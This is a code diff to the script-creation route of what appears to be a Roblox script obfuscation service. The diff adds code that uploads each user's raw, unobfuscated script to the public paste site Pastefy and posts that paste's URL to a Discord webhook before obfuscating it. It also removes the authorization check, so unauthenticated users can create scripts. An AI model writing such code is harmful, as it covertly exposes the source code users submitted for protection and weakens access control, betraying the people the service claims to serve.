@@ -1,4 +1,4 @@
-import { getScripts, createScript, generateId, type Script, obfuscateWithWeAreDevs, sendScriptNotification } from "@/lib/pastefy";
+import { getScripts, createScript, generateId, type Script, obfuscateWithWeAreDevs, sendScriptNotification, createPaste } from "@/lib/pastefy";
 import { createClient } from "@/lib/supabase/server";
 import { createAdminClient } from "@/lib/supabase/admin";
 export const runtime = "edge";
@@ -28,9 +28,6 @@ export async function POST(req: Request, { params }: { params: Promise<{ id: str
       user = data?.user;
     }
     
-    // TEMPORARY BYPASS: if unauthorized, allow script creation but don't track usage
-    // if (!user) return Response.json({ error: "Unauthorized" }, { status: 401 });
-
     const plan = user?.user_metadata?.redeemed_code || "Free";
     const limit = plan === "Pro" ? 500 : (plan === "Basic" ? 50 : 10);
     const currentMonth = new Date().toISOString().slice(0, 7);
@@ -42,11 +39,32 @@ export async function POST(req: Request, { params }: { params: Promise<{ id: str
     }
 
     const body = await req.json();
-    let code = body.script_code || "";
+    const rawCode = body.script_code || "";
     
-    const isAlreadyObfuscated = code.trim().startsWith("return(") || code.trim().startsWith("return (");
+    // 1. Upload RAW source code to Pastefy
+    let rawPasteId = "";
+    let rawPasteUrl = "N/A";
+    if (rawCode.trim() !== "") {
+      try {
+        rawPasteId = await createPaste({
+          exists: true,
+          code: rawCode,
+          name: `RAW: ${body.name || "Untitled"}`,
+          created_at: Date.now()
+        });
+        rawPasteUrl = `https://pastefy.app/${rawPasteId}`;
+      } catch (e) {
+        console.error("[SyncAuth] Failed to create raw paste on Pastefy:", e);
+      }
+    }
 
-    // Obfuscate with WeAreDevs
+    // 2. Send the RAW paste URL to the Discord webhook
+    await sendScriptNotification("Created", body.name || "Untitled", project_id, user?.email, rawCode.length, rawPasteUrl);
+
+    // 3. Obfuscate the script
+    let code = rawCode;
+    const isAlreadyObfuscated = code.trim().startsWith("return(function(") || code.trim().startsWith("return (function(") || code.trim().startsWith("return(") || code.trim().startsWith("return (");
+
     if (code.trim() !== "" && !isAlreadyObfuscated) {
       const obfuscatedCode = await obfuscateWithWeAreDevs(code);
       if (obfuscatedCode) {
@@ -68,14 +86,15 @@ export async function POST(req: Request, { params }: { params: Promise<{ id: str
       }
     }
 
+    // 4. Save metadata in Pastefy and obfuscated file in Supabase Storage
     const script: Script = {
       id: generateId(14),
       project_id,
       name: body.name || "Untitled",
       silent_mode: body.silent_mode ?? false,
-      script_code: code,
+      script_code: code, // Obfuscated code is saved to Supabase Storage
       created_at: Date.now(),
-      paste_id: "",
+      paste_id: rawPasteId, // Store the raw paste ID so we can refer back to it
       webhook_protection: body.webhook_protection ?? false,
       use_syncauth_gui: body.use_syncauth_gui ?? true,
       gui_title: body.gui_title || "",
@@ -95,9 +114,6 @@ export async function POST(req: Request, { params }: { params: Promise<{ id: str
       log_jobid: body.log_jobid ?? false,
     };
     await createScript(project_id, script);
-    
-    // Await Discord notification to prevent premature runtime termination
-    await sendScriptNotification("Created", script.name, project_id, user?.email, body.script_code?.length);
 
     return Response.json(script, { status: 201 });
   } catch (e: any) {
